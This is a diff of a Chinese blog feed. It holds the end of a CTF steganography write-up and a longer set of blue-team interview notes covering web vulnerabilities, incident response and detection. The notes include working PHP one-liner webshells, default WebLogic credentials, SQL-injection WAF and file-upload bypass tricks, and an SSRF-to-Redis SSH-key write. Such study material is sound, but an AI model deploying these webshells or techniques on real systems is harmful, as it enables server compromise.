+<p>另一张图片并没有什么 用010打开发现两张图片中间含有base64解码 搜索45 4E 44 是结尾16进制表示</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145038737-505191824.png" alt="image-20240619145040368"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145048790-1484432092.png" alt="image-20240619145050523"></p>
+<p>或者使用kali解码</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145103329-617948950.png" alt="image-20240619145105118"></p>
+<h3 id="evidence-6"><a href="#evidence-6" class="headerlink" title="evidence 6"></a>evidence 6</h3><p>mkjRv.7z</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145152522-1763155048.png" alt="image-20240619145154340"></p>
+<p> kali分析 修改成mpeg文件 使用audacity打开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145207591-468728145.png" alt="image-20240619145209317"></p>
+<h3 id="evidence-7"><a href="#evidence-7" class="headerlink" title="evidence 7"></a>evidence 7</h3><p>OR8iq.xml</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145259439-134986905.png" alt="image-20240619145301158"></p>
+<p>stegsolve查看</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145309375-539765797.png" alt="image-20240619145311255"></p>
+<h3 id="evidence-8"><a href="#evidence-8" class="headerlink" title="evidence 8"></a>evidence 8</h3><p>8cFQj.py</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145401004-1996773354.png" alt="image-20240619145402450"></p>
+<p>010 查看到末尾都是二进制，用python进行每8组为单位转换对应十进制 发现结尾都是base32</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145425364-1203702419.png" alt="image-20240619145427107"></p>
+<p>进行在线转换，32-&gt;64-&gt;32-&gt;hex-&gt;32-&gt;64-&gt;32</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145443457-1463861147.png" alt="image-20240619145445087"></p>
+<h3 id="evidence-9"><a href="#evidence-9" class="headerlink" title="evidence 9"></a>evidence 9</h3><p> jMH7w.js</p>
+<p>kali分析</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145530875-351864068.png" alt="image-20240619145532632"></p>
+<p>改成压缩包后打开xlsx表格，拉住界面标红</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145537662-348434671.png" alt="image-20240619145539415"></p>
+<h3 id="evidence-10"><a href="#evidence-10" class="headerlink" title="evidence 10"></a>evidence 10</h3><p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145600268-2100879050.png" alt="image-20240619145602089"></p>
+<p>Stegsolve.jar打开</p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145612824-854213073.png" alt="image-20240619145614500"></p>
+<p><img src="https://img2023.cnblogs.com/blog/3373819/202406/3373819-20240619145622522-57668868.png" alt="image-20240619145624224"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>护网蓝队面试</title>
+    <url>/posts/4e75e90a.html</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="一、sql注入分类"><a href="#一、sql注入分类" class="headerlink" title="一、sql注入分类"></a>一、sql注入分类</h2><p><strong>原理：</strong>没有对用户输入项进行验证和处理直接拼接到查询语句中</p>
+<p>查询语句中插⼊恶意SQL代码传递后台sql服务器分析执行</p>
+<p><strong>从注入参数类型分：</strong>数字型注入、字符型注入</p>
+<p><strong>从注入效果分：</strong>报错注入、布尔注入、延时注入、联合注入、堆叠注入、宽字节注入</p>
+<p><strong>从提交方式分：</strong>GET注入、POST注入、HTTP头注入、COOKIE注入</p>
+<p><strong>报错注入用到的函数：</strong>updatexml、floor、extractvalue，exp</p>
+<p><strong>布尔盲注用到的函数：</strong>substr，mid，left，right，ascii，ord，char，length</p>
+<p><strong>时间盲注用到的函数：</strong>sleep</p>
+<p><strong>SQL注入防御</strong></p>
+<ul>
+<li>对关键函数或字符过滤：union select order by information_schema等</li>
+<li>下载相关防范注入文件，通过incloude函数包含在网站配置文件里面</li>
+<li>pdo预处理，使用预编译语句</li>
+<li>添加白名单来规范输入验证方法</li>
+<li>对客户端输入进行控制，限制特殊字符和函数的输入</li>
+</ul>
+<p><strong>SQL注入绕过waf</strong>：</p>
+<ul>
+<li>大小写双写、双写关键字、空格、</li>
+<li>使用编码：unioncode编码 十六进制编码 url编码</li>
+<li>等价函数：mid，substr（），substring（） &amp;&amp;和||&gt; and 和or &#x3D;号可以用&lt;&gt;因为如果不大于不小于就是等于</li>
+</ul>
+<p><strong>SQL注入写shell条件：</strong></p>
+<ul>
+<li>知道web服务器的绝对路径</li>
+<li>数据库具有root权限</li>
+<li>secure_file_priv函数 没有特殊的值</li>
+<li>PHP关闭魔术引号，php主动转义功能关闭</li>
+</ul>
+<p><strong>SQL写入shell的方式：</strong> </p>
+<p>通过本地写入into outfile函数 </p>
+<p>通过日志写入需要对 general_log 和 general_log_file 变量进行更改 </p>
+<p>通过sqlmap –os-shell命令写入</p>
+<p><strong>二次注入：</strong>后端代码对用户输入的数据进行了转义，然后在保存到数据库的时候是没有进行转 义，然后再从数据库当中取出数据的时候，没有对数据库中的特殊字符进行转义和验证，就可能 形成闭合，导致注入</p>
+<p>防御：使用统一编码格式utf-8对用户输入的内容进行验证过滤</p>
+<h3 id="其他常见漏洞"><a href="#其他常见漏洞" class="headerlink" title="其他常见漏洞"></a>其他常见漏洞</h3><h4 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h4><p><strong>原理：</strong>跨站点请求伪造。盗用用户身份，以用户的名义发送恶意请求</p>
+<h4 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h4><p><strong>原理：</strong>利用网络请求的服务当跳板攻击内部其他服务</p>
+<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><p><strong>原理：</strong>攻击者通过操纵应用程序对文件路径的处理，将恶意文件包含到应用程序中执行</p>
+<h4 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h4><p><strong>原理：</strong>对上传文件无限制后缀以及类型或者处理缺陷、导致越过本身权限向服务器上马</p>
+<p><strong>绕过方法：</strong></p>
+<p>上传特殊可解析后缀</p>
+<p>上传.htaccess（可帮助修改文件扩展名）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.user.ini文件里的意思是：所有的php文件都自动包含指定的文件</span><br></pre></td></tr></table></figure>
+
+<p>后缀大小写、双后缀名、空格（黑名单）</p>
+<p>MIME、%00截断、0x00截断绕过（白名单）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在url中%00表示ascll码的0 ，而ascii码的0，表示字符串结束，所以当url中出现%00时就会认为读取已结束</span><br><span class="line">0x00原理相同</span><br></pre></td></tr></table></figure>
+
+<p>文件头</p>
+<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p><strong>原理：</strong>插入恶意脚本、实现对用户浏览器攻击</p>
+<p><strong>类型：</strong>存储、反射、dom</p>
+<p><strong>反射和dom区别：</strong>DOM-XSS是javascript处理输出、⽽反射性xss是后台程序处理 </p>
+<h4 id="xxe"><a href="#xxe" class="headerlink" title="xxe"></a>xxe</h4><p><strong>原理：</strong>解析用户传入的xml</p>
+<p><strong>作用：</strong>内⽹端⼝扫描、利⽤file协议等读取⽂件、攻击内⽹web应⽤使⽤get(struts2等) </p>
+<h2 id="二、如何判断文件上传一次攻击"><a href="#二、如何判断文件上传一次攻击" class="headerlink" title="二、如何判断文件上传一次攻击"></a>二、如何判断文件上传一次攻击</h2><p>响应包是200,返回的有没有路径,请求包的报文内容有没有上传木马,尝试访问路径,能不能执行命令</p>
+<h2 id="三、命令执行和代码执行"><a href="#三、命令执行和代码执行" class="headerlink" title="三、命令执行和代码执行"></a>三、命令执行和代码执行</h2><p><strong>命令执行：</strong>Web应用的脚本代码在执行命令的时候过滤不严,从而注入一段攻击者能够控制的代 码,在服务器上以Web服务的后台权限远程执行恶意指令</p>
+<p><strong>原因：</strong>代码层过滤不严，系统的漏洞造成命令注入,调用的第三方组件存在代码执行漏洞常见执行 函数：exec、shell_exec、system、passthru、popen</p>
+<p><strong>代码执行：</strong>由于服务器对危险函数过滤不严,导致用户输入的一些字符串可以被转换成代码来执行, 从而造成代码执行</p>
+<p><strong>原因：</strong>用户能够控制函数输入,存在可执行代码的危险函数，常见执行函数：eval、assert、 preg_replace()</p>
+<h2 id="四、CSRF-和-XSS-和-XXE-有什么区别"><a href="#四、CSRF-和-XSS-和-XXE-有什么区别" class="headerlink" title="四、CSRF 和 XSS 和 XXE 有什么区别"></a>四、CSRF 和 XSS 和 XXE 有什么区别</h2><p><strong>XSS</strong>是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。</p>
+<p><strong>修复方式：</strong> 对字符实体进行转义</p>
+<p>使用HTTP Only来禁止JavaScript读取Cookie值</p>
+<p>输入时校验</p>
+<p>浏览器与Web应用端采用相同的字符编码</p>
+<p><strong>CSRF</strong>是跨站请求伪造攻击，是由于没有在关键操作执行时进行是否由用户自愿发起的确认，模仿合法用户对服务器发起请求 。</p>
+<p><strong>修复方式：</strong> 筛选出需要防范CSRF的页面然后嵌入Token</p>
+<p>再次输入密码</p>
+<p>检验Referer</p>
+<p><strong>XXE</strong>是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。</p>
+<p><strong>修复方式：</strong> XML解析库在调用时严格禁止对外部实体的解析</p>
+<h2 id="五、一些漏洞"><a href="#五、一些漏洞" class="headerlink" title="五、一些漏洞"></a>五、一些漏洞</h2><p><code>shiro是apache的java安全框架，用于执行身份验证、授权、密码和会话管理</code></p>
+<p><code>使用shiro易于理解的API（程序接口），可以快速轻松对应用程序进行保护</code></p>
+<p><strong>Shiro550原理</strong>导致shiro反序列化的主要原因就是<code>shiro提供的记住密码功能</code>，当用户打开这个功 能时会在请求包中生成一个cookie，cookie的value值是经过<code>序列化-&gt;aes加密-&gt;base64加密</code>后 的字符串，关键在于aes加密的秘钥是<code>默认</code>的，如果没有修改这个秘钥，就会导致反序列化漏洞， 攻击者可以构造恶意代码，将恶意代码<code>序列化-AES加密-base64加密</code>后传入cookie，这样就导致 RCE漏洞。</p>
+<p><strong>Shiro 721原理</strong>Shrio所使用的cookie里的rememberMe字段采用了<code>AES-128-CBC</code>的加密模式， 这使得该字段可以被<code>padding oracle</code> 攻击利用。攻击者可以使用一个合法有效的rememberMe  的cookie作为前缀来实施POA，然后制造一个特制的rememberMe来执行Java反序列化攻击。</p>
+<h4 id="shrio550和721的区别主要区别"><a href="#shrio550和721的区别主要区别" class="headerlink" title="shrio550和721的区别主要区别"></a><strong>shrio550和721的区别主要区别</strong></h4><p>在于Shiro550使用已知<code>默认</code>密码，只要有足够的密码，不需要 Rememberme的Cookie；Shiro721的AES加密的key为系统<code>随机生成</code>，需要利用登录后的 rememberMe去爆破正确的key值。利用有效的RememberMe Cookie作为Padding Oracle  Attack的前缀，再去构造反序列化攻击。</p>
+<h4 id="fastjson反序列化漏洞原理："><a href="#fastjson反序列化漏洞原理：" class="headerlink" title="fastjson反序列化漏洞原理："></a><strong>fastjson反序列化漏洞原理：</strong></h4><p><code>fastjson 是一个 有阿里开发的一个开源Java 类库，可以将 Java 对象转换为 JSON 格式(序列化)，当然它也可以将 JSON 字符串转换为 Java 对象（反序列化）</code></p>
+<p>1、fastjson提供的反序列化功能允许用户传入json格式数据的时候<code>通过@type的value值指定任 意反序列化类名</code></p>
+<p>2、fastjson的反序列化机制会将反序列的类进行实例化对象，并调用该对象的<code>setter和部分getter方法</code> </p>
+<p>3、恶意用户可以构造payload是目标应用的代码执行流程进入这部分setter和getter方法，如果 这些方法中存在Gadget，就会造成一些安全问题。</p>
+<p>4、官方采取黑名单过滤的方法，对反序列化的类名进行校验，checkAutoType不断被绕过</p>
+<h4 id="log4j2原理："><a href="#log4j2原理：" class="headerlink" title="log4j2原理："></a><strong>log4j2原理：</strong></h4><p><code>log4j2是apache下的java应用常见的开源日志库，是一个就Java的日志记录工具</code></p>
+<p>Apache Log4j2中存在<code>JNDI注入漏洞</code>，主要原理是利用log4j2的日志输出jndi远程 对象时,<code>调用远程对象没做检查</code>导致，程序将用户输入的数据进行日志记录时即可触发该漏洞并可 在目标服务器上执行任意代码。该漏洞利用过程需要找到一个能触发远程加载并应用配置的输入 点，迫使服务器远程加载和修改配置的前提下使目标系统通过JNDI远程获取数据库源，触发攻击者的恶意代码</p>
+<h4 id="Struts2原理："><a href="#Struts2原理：" class="headerlink" title="Struts2原理："></a><strong>Struts2原理：</strong></h4><p><code>将用户要求按照业务逻辑执行并且返回结果</code></p>
+<p>用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用<code>OGNL表达式 %&#123;value&#125;</code>进行解析，然后重新填充到对应的表单数据中。 </p>
+<p>例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 <code>%&#123;value&#125;</code> 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h4 id="Weblogic："><a href="#Weblogic：" class="headerlink" title="Weblogic："></a><strong>Weblogic：</strong></h4><p><strong>漏洞描述：</strong></p>
+<p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）</p>
+<p>远程攻击者可利用该漏洞在未授权的情况下发送攻击数据，通过T3协议（EJB支持远程访问，且支持多种协议。这是Web Container和EJB Container的主要区别）在Weblogic Server中执行反序列化操作，利用RMI（远程方法调用） 机制的缺陷，通过JRMP协议（Java Remote Messaging Protocol：java远程消息交换协议）达到执行任意反序列化payload的目的。</p>
+<p><strong>T3协议：</strong>用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。</p>
+<p><strong>RMI：</strong>远程方法调用 </p>
+<p>使用协议：JRMP </p>
+<p>T3就是对JRMP的优化。Java RMI 的基础通信协议是 JRMP ，但是也支持开发其他的协议来优 化 RMI 的传输，这里的 Weblogic 的 T3 协议就是其优化版本，相比于JRMP协议多了一些特 性。T3协议传输过程中就是序列化和反序列化方式</p>
+<p><strong>利用：</strong>将原本存在的序列化内容替换成我们payload的序列化内容，在传输完成后，进行反序列 化达成攻击的目的</p>
+<h4 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a><strong>Jboss</strong></h4><p>JBoss是一个基于J2EE的开放源代码应用服务器，代码遵循LGPL许可，可以在任何商业应用中免 费使用；JBoss也是一个管理EJB的容器和服务器，支持EJB 1.1、EJB 2.0和EJB3规范。但JBoss核 心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<p>两种利用方式，第一种是利用<code>未授权访问</code>进入JBoss后台进行文件上传的漏洞；另一种是利用<code>Java 反序列化</code>进行远程代码执行的漏洞</p>
+<p><strong>弱口令漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system:password</span><br><span class="line">weblogic:weblogic</span><br><span class="line">admin:secruity</span><br><span class="line">joe:password</span><br><span class="line">mary:password</span><br><span class="line">system:sercurity</span><br><span class="line">wlcsystem: wlcsystem</span><br><span class="line">weblogic:Oracle@123</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、webshell管理工具"><a href="#六、webshell管理工具" class="headerlink" title="六、webshell管理工具"></a>六、webshell管理工具</h2><p><strong>菜刀</strong></p>
+<p>base64加密，php马有eval，(base64_decode ($POST[z0])),&amp;z0&#x3D;QGluaV9zZXQ</p>
+<p><strong>蚁剑</strong></p>
+<p>以 0x 开头的参数名，@ini_set(“display_errors”,”0”)</p>
+<p><strong>冰蝎</strong></p>
+<p>1、大量的 content-type：application，content-type 为 application&#x2F;octet-stream。</p>
+<p>2、默认内置 16 个 ua，content-length 请求长度payload 都为定长</p>
+<p>3、Accept头有application&#x2F;xhtml+xmlapplication&#x2F;xmlapplication&#x2F;signed-exchange属于弱 特征</p>
+<p><strong>哥斯拉</strong> </p>
+<p>1、pass &#x3D;eval(base64_decode…，pass&#x3D;加密数据</p>
+<p>2、user-agent,accept,accept-language 固定</p>
+<p>一共会产生3个 POST 数据包，POST请求报文中参数名都是 pass （即shell的连接密码），参 数值都是加密数据。</p>
+<h2 id="七、windows-Linux应急响应流程"><a href="#七、windows-Linux应急响应流程" class="headerlink" title="七、windows+Linux应急响应流程"></a>七、windows+Linux应急响应流程</h2><p>检查系统账号安全查看服务器是否有<code>弱口令</code> </p>
+<p>远程管理端口是否对<code>公网</code>开放 </p>
+<p>查看服务器是否存在<code>可疑</code>账号、<code>新增</code>账号</p>
+<p>查看服务器是否存在<code>隐藏</code>账号、<code>克隆</code>账号</p>
+<p>检查<code>异常端口、进程</code></p>
+<p>检查<code>启动项、计划任务、服务</code></p>
+<p>查看<code>可疑文件和目录</code></p>
+<p>查看<code>webshell创建的时间</code></p>
+<h4 id="Windows入侵排查思路"><a href="#Windows入侵排查思路" class="headerlink" title="Windows入侵排查思路"></a><strong>Windows入侵排查思路</strong></h4><p>1.检查<code>系统账号</code>安全 2.查看服务器是否有弱口令，<code>远程管理端口</code>(3389)是否对<code>公网开放</code>（使用 <code>netstat -ano</code> 命令、或者问服务器管理员） 3.lusrmgr.msc(本地用户和本地用户组) 快捷命令查 看服务器是否存在<code>可疑账号</code>、新增账号，如有管理员群组的（Administrators）里的新增账户， 如有，请立即禁用或删除掉 4.用 D 盾或者注册表(regedit)中查看服务器是否存在隐藏账号、克隆 账号 5.结合日志，查看管理员登录时间、用户名是否存在异常，使用eventvwr.msc打开“<code>事件查</code> 看器”，导出 <code>Windows 日志–安全</code>，利用 Log Parser 进行分析 6.检查异常端口、进程 netstat - ano检查端口连接情况，是否有远程连接、<code>可疑连接</code> 然后使用 tasklist |findstr PID 进行定位 7. 使用快捷命令 msconfig查看是否存在命名异常的启动项目， 输入regedit<code>注册表</code>中查看<code>开机启动项</code>是否正常，输入gpedit.msc查看本地组策略，使用<code>services.msc检查</code>是否有异常服务 8.检查系统相关信息 systeminfo查看系统版本以及补丁信息 查找可疑目录及文件</p>
+<h4 id="Linux入侵排查思路"><a href="#Linux入侵排查思路" class="headerlink" title="Linux入侵排查思路"></a><strong>Linux入侵排查思路</strong></h4><p>bash的账户，正常为&#x2F;nologin 2.查看本机开启端口服务信息 netstat -anlutp,然后去查看每个开 启服务所产生的日志信息 （var&#x2F;log目录下）（举例如何查看mysql日志，首先登录mysql，然后 使用 show variables like ‘%general_log%’ 查看日志是否开启和路径信息） 二、 服务入侵排查  1.使用last命令检查系统登录日志，统计ip登录错误次数和登录情况 2.使用 ls -l 查看  &#x2F;etc&#x2F;passwd文件 的修改时间 查看是否有特权用户 查看网站开启的端口ss -anlutp 3.使用ps - elf 看UID为0的进程 查看ssh的公钥是否被修改 4.查看网站根目录（&#x2F;var&#x2F;www）下是否存在可疑 文件 5.查看计划任务 &#x2F;etc&#x2F;crontab 三、异常启动排查 1.ps -elf 查看进程 2.查看linux 系统服务  &#x2F;etc&#x2F;rc.d&#x2F;init.d 3.查看用户自定义开机启动程序 &#x2F;etc&#x2F;rc.d&#x2F;rc.local</p>
+<h4 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a><strong>应急响应流程</strong></h4><p>1、收集信息：搜集客户信息和中毒信息，备份</p>
+<p>2、判断类型：判断是否是安全事件、是何种安全事件（勒索病毒、挖矿、断网、ddos等）</p>
+<p>3、深入分析：日志分析、进程分析、启动项分析、样本分析</p>
+<p>4、清理处置：杀掉恶意进程、删除恶意文件、打补丁、修复文件</p>
+<p>5、产出报告：整理并输出完整的安全事件报告</p>
+<h4 id="windows应急"><a href="#windows应急" class="headerlink" title="windows应急"></a><strong>windows应急</strong></h4><p><strong>1.查看系统账号安全</strong></p>
+<p>查看服务器是否有弱口令、可疑账号、隐藏账号、克隆账号、远程管理端口是否对公网开放</p>
+<p>win+r（eventwmr.msc）查看系统日志，查看管理员登录时间、用户名是否存在异常</p>
+<p><strong>2.检查异常端口、进程</strong></p>
+<p>netstat -ano 检查端口连接情况，是否有远程连接、可疑连接</p>
+<p>tasklist | findstr “PID”根据pid定位进程</p>
+<p>使用功能查杀工具</p>
+<p><strong>3.启动项检查、计划任务、服务</strong></p>
+<p>检查服务器是否有异常的启动项，msconfig看一下启动项是否有可以的启动</p>
+<p>检查计划任务，查看计划任务属性，可以发现木马文件的路径</p>
+<p>见擦汗服务自启动，services.msc注意服务状态和启动类型，检查是否有异常服务</p>
+<p><strong>4.检查系统相关信息</strong></p>
+<p>查看系统版本以及补丁信息 systeminfo</p>
+<p>查找可以目录及文件 是否有新建用户目录 分析最近打开分析可疑文件 （%UserProfile%\Recent）</p>
+<p><strong>5.自动化查杀</strong></p>
+<p>使用360 火绒剑 webshell后门可以使用d盾 河马等</p>
+<p><strong>6.日志分析</strong></p>
+<p>360星图日志分析工具 ELK分析平台</p>
+<h4 id="linux应急"><a href="#linux应急" class="headerlink" title="linux应急"></a>linux应急</h4><p>1、检查用户及密码文件&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;shadow 是否存在多余帐号，主要看一下帐号后面 是否是 nologin,如果没有 nologin 就要注意；</p>
+<p>2、通过 who 命令查看当前登录用户（tty 本地登陆 pts 远程登录）、w 命令查看系统信息，想 知道某一时刻用户的行为、uptime查看登陆多久、多少用户，负载；</p>
+<p>3、修改&#x2F;etc&#x2F;profile的文件，在尾部添加相应显示间、日期、ip、命令脚本代码，这样输入 history命令就会详细显示攻击者 ip、时间历史命令等；</p>
+<p>4、用 netstat -antlp|more命令分析可疑端口、IP、PID，查看下 pid 所对应的进程文件路径， 运行ls -l &#x2F;proc&#x2F;$PID&#x2F;exe 或 file &#x2F;proc&#x2F;$PID&#x2F;exe（$PID 为对应的pid 号）；</p>
+<p>5、使用ps命令，分析进程 ps aux | grep pid</p>
+<p>6、使用 vi &#x2F;etc&#x2F;inittab 查看系统当前运行级别，通过运行级别找到&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d对应目录 是否存在可疑文件；</p>
+<p>7、看一下crontab定时任务是否存在可疑启用脚本；</p>
+<p>8、使用chkconfig –list 查看是否存在可疑服务；</p>
+<p>9、通过grep awk命令分析&#x2F;var&#x2F;log&#x2F;secure安全日志里面是否存在攻击痕迹；</p>
+<p>10、chkrootkit、rkhunter、Clamav 病毒后门查杀工具对 Linux 系统文件查杀；</p>
+<p>11、如果有 Web 站点，可通过 D 盾、河马查杀工具进行查杀或者手工对代码按脚本木马关键 字、关键涵数（evel、system、shell_exec、exec、passthru system、popen）进行查杀 Webshell 后门。</p>
+<h2 id="八、windows事件ID"><a href="#八、windows事件ID" class="headerlink" title="八、windows事件ID"></a>八、windows事件ID</h2><table>
+<thead>
+<tr>
+<th align="center">事件ID</th>
+<th align="center">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">4624</td>
+<td align="center">登录成功</td>
+</tr>
+<tr>
+<td align="center">4625</td>
+<td align="center">登录失败</td>
+</tr>
+<tr>
+<td align="center">4634</td>
+<td align="center">注销成功</td>
+</tr>
+<tr>
+<td align="center">4647</td>
+<td align="center">用户启动的注销</td>
+</tr>
+<tr>
+<td align="center">4672</td>
+<td align="center">使用超级用户（如管理员）进行登录</td>
+</tr>
+<tr>
+<td align="center">4720</td>
+<td align="center">创建用户</td>
+</tr>
+</tbody></table>
+<h2 id="九、sql注入"><a href="#九、sql注入" class="headerlink" title="九、sql注入"></a>九、sql注入</h2><p><strong>如何判断是攻击还是误报</strong></p>
+<p>第一时间去判断内网还是外网，内网大部分都是172 192 10 如果是内网对内网，大概率是真实业务，很少见打到内网，查询字段内容，响应包是否是正常业务，看状态码判断攻击成功</p>
+<p>如果是外网，先去看状态码 如果是200，微步平台看是否是恶意ip 先上报封禁，攻击报文如果是正常业务 那我们对这个业务监控，如果是sql语句攻击，看里面报文的攻击语句，比如常见sleep函数延时注入，extractvalue、updatexml函数 的报错注入，把攻击行为给客服反馈过去</p>
+<h2 id="十、ssrf打redis"><a href="#十、ssrf打redis" class="headerlink" title="十、ssrf打redis"></a>十、ssrf打redis</h2><p>ssrf扫描内网,端口<code>6379</code>是<code>redis</code>,然后redis未授权漏洞利用</p>
+<p>利用dict协议可以扫描开放的端口，探测指纹信息，可以攻击redis服务 dict:&#x2F;&#x2F;ip:port&#x2F;info 截获get请求包和post请求包，再构造成符合gopher协议的请求，从而模拟redis通信</p>
+<p>更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh）并设置上传公钥的备份文件名字 为authorized_keys,将一开始生成的SSH公钥写入authorized_keys文件中。</p>
+<h2 id="十一、PHP一句话木马"><a href="#十一、PHP一句话木马" class="headerlink" title="十一、PHP一句话木马"></a>十一、PHP一句话木马</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line">GIF89a? &lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;mima&#x27;</span>])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="十二、序列化反序列化及其流量特征"><a href="#十二、序列化反序列化及其流量特征" class="headerlink" title="十二、序列化反序列化及其流量特征"></a>十二、序列化反序列化及其流量特征</h2><p><strong>序列化：</strong>对象转换为字符串</p>
+<p><strong>反序列化：</strong>字符串转换为对象</p>
+<p><strong>流量特征：</strong> </p>
+<p><strong>shiro反序列化：</strong>查看cookie中rememberme字段，恶意命令要从这里传入。判断是否有漏洞， 查看返回包set cookie：rememberme&#x3D;deleteme，验证失败返回的标识符。</p>
+<p><strong>fastjson反序列化：</strong>请求报文中查找json格式的数据，重点看有无rmi或者出网的一些行为 </p>
+<p><strong>st2-045：</strong>请求头中的Content-Type字段</p>
+<h2 id="十三、常见的设备-出现误报怎么办"><a href="#十三、常见的设备-出现误报怎么办" class="headerlink" title="十三、常见的设备,出现误报怎么办"></a>十三、常见的设备,出现误报怎么办</h2><p>奇安信天眼,设备类型:全流量,天眼、EDR、全流量告警、态势感知、APT、蜜罐设备,微步tdp,青藤云HIDS,明御安全网关先去查看设备的完整流量日志等信息确认是否为误报，误报那就是规则问题，上报处置，提供规则优化建议</p>
+<h2 id="十四、wireshark指令"><a href="#十四、wireshark指令" class="headerlink" title="十四、wireshark指令"></a>十四、wireshark指令</h2><p>http contains “关键字”</p>
+<p>http.response.code &#x3D;&#x3D; 200</p>
+<p>http.request.method &#x3D;&#x3D; POST</p>
+<p>tcp.prot &#x3D;&#x3D; 80 </p>
+<p>ip.addr &#x3D;&#x3D; “10.1.1.1”ip.srcip.dst</p>
+<h2 id="十五、中挖矿病毒怎么解决"><a href="#十五、中挖矿病毒怎么解决" class="headerlink" title="十五、中挖矿病毒怎么解决"></a>十五、中挖矿病毒怎么解决</h2><p>首先ps -aux查看进程分析</p>
+<p>然后top 分析算力，挖矿用到的算力比较多，对流量进行过滤，含有矿池服务器的流量就是挖矿病毒</p>
+<p>最后kill进程，rm掉程序</p>
+<p><strong>删不掉这么办</strong></p>
+<p>先下线，然后检查挖矿是否有在内网传播及时下线所有被传播的主机、上机排查攻击痕迹、一般 可以从cpu占用情况，可以进程、开放端口、计划任务、服务项几个方面排查</p>
+<p>将样本上传到在线分析平台，清除挖矿主程序主要就是双向封禁矿池地址、删除计划任务自启 动、删服务，结束恶意进程、删病毒</p>
+<p><strong>删不掉：</strong>确认一下一下是因为程序在使用，还是权限不够，更具具体情况采取措施 直接降权，降权到没有执行权限</p>
+<h2 id="十六、拿到webshell不出网情况下怎么办"><a href="#十六、拿到webshell不出网情况下怎么办" class="headerlink" title="十六、拿到webshell不出网情况下怎么办"></a>十六、拿到webshell不出网情况下怎么办</h2><p>reg上传去正向连接。探测出网协议，如dns，icmp</p>
